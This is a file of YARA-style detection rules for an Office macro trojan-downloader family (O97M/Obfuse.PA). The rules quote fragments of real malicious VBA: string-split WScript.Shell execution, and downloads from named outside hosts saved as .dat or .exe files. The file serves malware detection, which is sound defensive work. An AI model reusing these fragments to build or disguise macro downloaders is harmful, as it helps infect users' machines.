
rule TrojanDownloader_O97M_Obfuse_PA_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.PA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {2e 53 61 76 65 54 6f 46 69 6c 65 20 28 22 43 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c 77 66 2e 64 61 74 22 29 } //1 .SaveToFile ("C:\users\public\wf.dat")
		$a_01_1 = {2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 3a 2f 2f } //1 .Open "GET", "http://
		$a_01_2 = {6c 6f 6e 67 6c 69 76 65 2e 63 61 73 61 2f 70 31 63 74 75 72 65 33 2e 6a 70 67 } //1 longlive.casa/p1cture3.jpg
		$a_01_3 = {2e 52 75 6e 20 22 22 20 26 20 28 52 65 71 75 65 73 74 41 72 67 75 6d 65 6e 74 20 2b 20 22 33 32 } //1 .Run "" & (RequestArgument + "32
		$a_01_4 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 52 75 6e 20 22 47 74 79 73 22 } //1 Application.Run "Gtys"
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Obfuse_PA_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.PA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 22 20 2b 20 22 53 63 22 20 2b 20 22 72 69 22 20 2b 20 22 70 74 22 20 2b 20 22 22 20 2b 20 22 2e 22 20 2b 20 22 53 68 22 20 2b 20 22 65 6c 22 20 2b 20 22 22 20 2b 20 22 6c 22 29 } //1 = CreateObject("W" + "Sc" + "ri" + "pt" + "" + "." + "Sh" + "el" + "" + "l")
		$a_01_1 = {50 6c 22 20 2b 20 22 22 20 2b 20 22 61 79 22 20 2b 20 22 22 20 2b 20 22 4c 69 22 20 2b 20 22 73 74 22 20 2b 20 22 22 20 2b 20 22 2e 22 20 2b 20 22 76 22 20 2b 20 22 22 20 2b 20 22 62 73 } //1 Pl" + "" + "ay" + "" + "Li" + "st" + "" + "." + "v" + "" + "bs
		$a_01_2 = {2e 52 75 6e 28 22 77 73 22 20 2b 20 22 22 20 2b 20 22 63 72 22 20 2b 20 22 69 70 22 20 2b 20 22 22 20 2b 20 22 74 22 20 2b 20 22 2e 22 20 2b 20 22 22 20 2b 20 22 65 78 22 20 2b 20 22 65 } //1 .Run("ws" + "" + "cr" + "ip" + "" + "t" + "." + "" + "ex" + "e
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Obfuse_PA_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.PA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {52 65 78 43 6f 6c 64 20 3d 20 52 65 70 6c 61 63 65 28 66 2c 20 22 78 22 2c 20 22 22 29 } //1 RexCold = Replace(f, "x", "")
		$a_01_1 = {52 65 78 43 6f 6c 64 32 20 3d 20 52 65 70 6c 61 63 65 28 66 2c 20 22 69 22 2c 20 22 22 29 } //1 RexCold2 = Replace(f, "i", "")
		$a_01_2 = {3d 20 43 61 6c 6c 42 79 4e 61 6d 65 28 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 22 20 26 20 22 53 63 72 69 22 20 26 20 52 65 78 43 6f 6c 64 32 28 22 70 69 74 69 2e 53 69 68 65 6c 6c 69 22 29 29 2c 20 52 65 78 43 6f 6c 64 32 28 22 52 75 69 6e 22 29 2c 20 31 2c 20 52 69 6b 50 30 2c 20 31 29 } //1 = CallByName(CreateObject("W" & "Scri" & RexCold2("piti.Sihelli")), RexCold2("Ruin"), 1, RikP0, 1)
		$a_01_3 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 74 61 72 74 75 70 50 61 74 68 20 26 20 52 65 78 43 6f 6c 64 28 22 78 78 78 5c 78 78 2e 78 2e 78 5c 2e 78 2e 78 78 5c 78 22 29 20 26 20 52 65 78 43 6f 6c 64 28 22 6a 78 53 6e 4f 66 64 64 2e 74 6f 76 63 6f 2e 22 29 } //1 Application.StartupPath & RexCold("xxx\xx.x.x\.x.xx\x") & RexCold("jxSnOfdd.tovco.")
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_Obfuse_PA_MTB_4{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.PA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {70 79 76 6a 48 66 47 4e 54 20 3d 20 70 79 76 6a 48 66 47 4e 54 20 2b 20 30 2e 30 35 30 34 36 32 39 34 31 39 39 20 2a 20 53 67 6e 28 34 2e 34 37 37 38 35 34 38 39 35 34 20 2b 20 35 32 31 37 35 2e 38 30 36 32 38 33 31 34 38 34 20 2a 20 4f 61 58 76 62 4a 4a 39 49 37 6e 29 } //1 pyvjHfGNT = pyvjHfGNT + 0.05046294199 * Sgn(4.4778548954 + 52175.8062831484 * OaXvbJJ9I7n)
		$a_01_1 = {6c 69 6e 65 77 68 72 69 74 65 72 2e 57 72 69 74 65 4c 69 6e 65 20 28 22 77 73 63 72 69 70 74 20 2f 2f 6e 6f 6c 6f 67 6f 20 63 3a 5c 77 69 6e 6c 6f 67 73 5c 64 65 62 75 67 2e 76 62 73 20 68 74 74 70 3a 2f 2f 6f 7a 63 61 6d 6c 69 62 65 6c 2e 63 6f 6d 2e 74 72 2f 77 70 2d 63 6f 6e 74 65 6e 74 2f 75 70 6c 6f 61 64 73 2f 32 30 31 39 2f 31 30 2f 6f 6b 6c 63 6e 6d 73 2e 74 69 66 66 20 63 3a 5c 77 69 6e 6c 6f 67 73 5c 6f 6c 79 5f 64 65 62 75 67 32 2e 65 78 65 22 29 } //1 linewhriter.WriteLine ("wscript //nologo c:\winlogs\debug.vbs http://ozcamlibel.com.tr/wp-content/uploads/2019/10/oklcnms.tiff c:\winlogs\oly_debug2.exe")
		$a_01_2 = {3d 20 4c 20 26 20 22 7c 22 20 26 20 42 20 26 20 22 7c 22 20 26 20 52 } //1 = L & "|" & B & "|" & R
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Obfuse_PA_MTB_5{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.PA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 "
		
	strings :
		$a_01_0 = {56 42 41 2e 43 61 6c 6c 42 79 4e 61 6d 65 20 56 42 41 2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 45 6d 70 74 79 20 2b 20 22 57 22 20 2b 20 45 6d 70 74 79 20 2b 20 22 53 63 22 20 26 20 45 6d 70 74 79 20 26 20 22 72 69 70 22 20 26 20 22 74 2e 22 20 26 } //1 VBA.CallByName VBA.CreateObject(Empty + "W" + Empty + "Sc" & Empty & "rip" & "t." &
		$a_01_1 = {22 52 22 20 26 20 45 6d 70 74 79 20 26 20 22 75 22 20 26 20 45 6d 70 74 79 20 26 20 45 6d 70 74 79 20 26 20 22 22 20 26 20 22 6e 22 2c 20 56 62 4d 65 74 68 6f 64 2c 20 5f } //1 "R" & Empty & "u" & Empty & Empty & "" & "n", VbMethod, _
		$a_03_2 = {3d 20 46 65 72 20 26 20 45 6d 70 74 79 20 26 20 22 5c [0-0a] 22 20 26 20 45 6d 70 74 79 } //1
		$a_03_3 = {3d 20 22 22 20 26 20 [0-0a] 20 26 20 45 6d 70 74 79 20 26 20 22 5c [0-0a] 2e 22 20 26 20 45 6d 70 74 79 20 26 20 22 63 22 20 26 20 45 6d 70 74 79 20 26 20 22 6d 22 20 26 20 45 6d 70 74 79 20 26 20 22 64 22 } //1
		$a_01_4 = {3d 20 45 6d 70 74 79 20 26 20 22 73 22 20 26 20 45 6d 70 74 79 20 26 20 22 68 22 20 26 20 22 22 20 26 20 22 22 20 26 20 22 65 6c 22 20 26 20 22 6c 22 20 26 20 45 6d 70 74 79 } //1 = Empty & "s" & Empty & "h" & "" & "" & "el" & "l" & Empty
		$a_01_5 = {4f 6c 65 72 72 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 74 61 72 74 75 70 50 61 74 68 } //1 Olerr Application.StartupPath
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_03_2  & 1)*1+(#a_03_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=6
 
}